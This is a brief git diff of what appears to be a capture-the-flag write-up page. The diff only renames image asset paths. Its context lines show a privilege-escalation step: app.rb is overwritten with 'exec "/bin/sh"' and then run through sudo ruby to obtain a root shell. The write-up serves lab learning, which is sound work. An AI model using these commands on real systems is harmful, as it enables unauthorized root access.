@@ -112,7 +112,7 @@ cp app.rb app.rb.bak
 echo 'exec "/bin/sh"' > app.rb
 ```
 
-<figure><img src="../.gitbook/assets/17 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/17 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
@@ -121,7 +121,7 @@ echo 'exec "/bin/sh"' > app.rb
 sudo /usr/bin/ruby /home/andrew/app/aap.rb
 ```
 
-<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
